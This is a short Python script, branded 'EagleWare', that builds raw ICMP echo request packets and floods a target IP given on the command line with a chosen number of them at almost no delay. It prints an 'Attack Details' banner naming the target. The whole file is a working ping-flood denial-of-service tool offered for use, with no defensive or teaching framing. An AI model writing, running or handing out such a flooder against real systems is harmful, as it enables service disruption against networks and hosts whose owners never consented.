import socket
import struct
import os
import sys
import time

def checksum(data):
    sum = 0
    length = len(data)
    i = 0

    while length > 1:
        sum += (data[i] << 8) + data[i + 1]
        i += 2
        length -= 2

    if length:
        sum += data[i]

    sum = (sum >> 16) + (sum & 0xFFFF)
    sum += (sum >> 16)
    return ~sum & 0xFFFF

def create_icmp_header(type, code, checksum, identifier, sequence):
    # Change 'h' to 'H' for unsigned short integers
    header = struct.pack('bbHHH', type, code, checksum, identifier & 0xFFFF, sequence & 0xFFFF)
    return header

def print_attack_details(ip, packet_count):
    os.system('cls' if os.name == 'nt' else 'clear')
    width = os.get_terminal_size().columns
    print(' ' * ((width - 30) // 2) + "EagleWare Attack Details")
    print(' ' * ((width - 40) // 2) + "╔════════════════════════════════╗")
    print(' ' * ((width - 40) // 2) + f" Target IP: {ip}")
    print(' ' * ((width - 40) // 2) + f" Number of Packets: {packet_count}")
    print(' ' * ((width - 40) // 2) + " Method: ICMP")
    print(' ' * ((width - 40) // 2) + "╚════════════════════════════════╝")

def send_icmp_packets(ip, identifier, packet_count):
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock:
        type = 8  
        code = 0
        data = b'abcdefgh'
        
        for sequence in range(packet_count):
            checksum_value = 0
            header = create_icmp_header(type, code, checksum_value, identifier, sequence)
            packet = header + data

            checksum_value = checksum(packet)
            header = create_icmp_header(type, code, checksum_value, identifier, sequence)
            packet = header + data

            sock.sendto(packet, (ip, 0))

            print(f"{sequence + 1} packets sent.", end='\r')

            time.sleep(0.00000001)

        print(f"{packet_count} packets sent.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(1)

    target_ip = sys.argv[1]
    packet_count = int(sys.argv[2])

    print_attack_details(target_ip, packet_count)
    send_icmp_packets(target_ip, os.getpid(), packet_count)
